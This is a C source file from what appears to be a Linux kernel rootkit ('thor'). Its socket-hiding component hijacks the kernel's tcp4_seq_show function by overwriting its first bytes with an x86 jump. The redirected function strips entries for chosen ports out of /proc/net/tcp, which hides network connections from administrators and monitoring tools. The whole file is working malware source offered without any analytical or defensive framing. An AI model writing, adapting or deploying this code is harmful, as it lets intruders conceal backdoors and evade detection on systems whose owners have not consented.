#include "helper.h"
#include "sockethider.h"

#include <linux/slab.h>
#include <linux/version.h>
#include <net/tcp.h>

struct _tcp4_list {
    int port;
    struct list_head list;
};

/* hiding list */
static struct _tcp4_list tcp4_list;

/* original tcp4_seq_show which we need to hijack */
static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
#if CONFIG_X86
/* store the first instruction(s) of tcp4_seq_show */
/* we overwrite it with an instruction of lenght 5 Byte */
char tcp4_seq_show_firstinstr[5];
#else
#error architecture not yet supported
#endif

/* defines */
#define TMPSZ 150

/* function prototypes */
static int thor_tcp4_seq_show(struct seq_file *seq, void *v);

/* function to get a pointer to the tcp{4,6}_seq_show function */
static void *get_tcp_seq_show(const char *path)
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filep->f_dentry->d_inode)->data;
    #else
    afinfo = PDE_DATA(filep->f_dentry->d_inode);
    #endif
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

static void hijack_tcp4_seq_show(void)
{
#if CONFIG_X86
    int32_t jmp;

    /* store the first 5 bytes of tcp4_seq_show, as we overwrite it with a
     * jmp instruction, which is of length 5 byte */
    memcpy(&tcp4_seq_show_firstinstr, tcp4_seq_show, 5);

    jmp = (int32_t)(thor_tcp4_seq_show - tcp4_seq_show);

    set_addr_rw(tcp4_seq_show);

    /* x86 rjmp */
    ((char*)tcp4_seq_show)[0] = 0xE9;

    /* store jump address as little endian */
    ((char*)tcp4_seq_show)[1] = (jmp & 0xFF);
    ((char*)tcp4_seq_show)[2] = (jmp & 0xFF00) >> 8;
    ((char*)tcp4_seq_show)[3] = (jmp & 0xFF0000) >> 16;
    ((char*)tcp4_seq_show)[4] = jmp >> 24;

    set_addr_ro(tcp4_seq_show);
#endif
}

static void unhijack_tcp4_seq_show(void)
{
#if CONFIG_X86
    set_addr_rw(tcp4_seq_show);
    memcpy(tcp4_seq_show, tcp4_seq_show_firstinstr, 5);
    set_addr_ro(tcp4_seq_show);
#endif
}

static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char port[12];
    struct _tcp4_list *tmp;

    /* TODO: this leaves the tcp4_seq_show function unhijacked for a few
     * cycles, ideally we would execute the content of tcp4_seq_show_firstinstr
     * and jump to the second instruction of the original tcp4_seq_show */
    unhijack_tcp4_seq_show();
    ret = tcp4_seq_show(seq, v);
    hijack_tcp4_seq_show();

    /* hide port */
    list_for_each_entry(tmp, &(tcp4_list.list), list) {
        sprintf(port, ":%04X", tmp->port);

        if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return 0;
}

int sockethider_init(void)
{
    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    if(tcp4_seq_show == NULL) return -1;

    hijack_tcp4_seq_show();
    
    INIT_LIST_HEAD(&tcp4_list.list);

    return 0;
}

void sockethider_cleanup(void)
{
    if(tcp4_seq_show != NULL) {
        unhijack_tcp4_seq_show();
    }

    clear_tcp4_list();
}

void add_to_tcp4_list(int port)
{
    struct _tcp4_list *tmp;

    tmp = (struct _tcp4_list*)kmalloc(sizeof(struct _tcp4_list), GFP_KERNEL);
    tmp->port = port;

    list_add(&(tmp->list), &(tcp4_list.list));
}

void remove_from_tcp4_list(int port)
{
    struct _tcp4_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(tcp4_list.list)) {
        tmp = list_entry(pos, struct _tcp4_list, list);
        if(port == tmp->port) {
            list_del(pos);
            kfree(tmp);
        }
    }
}

void clear_tcp4_list(void)
{
    struct _tcp4_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(tcp4_list.list)) {
        tmp = list_entry(pos, struct _tcp4_list, list);
        list_del(pos);
        kfree(tmp);
    }
}

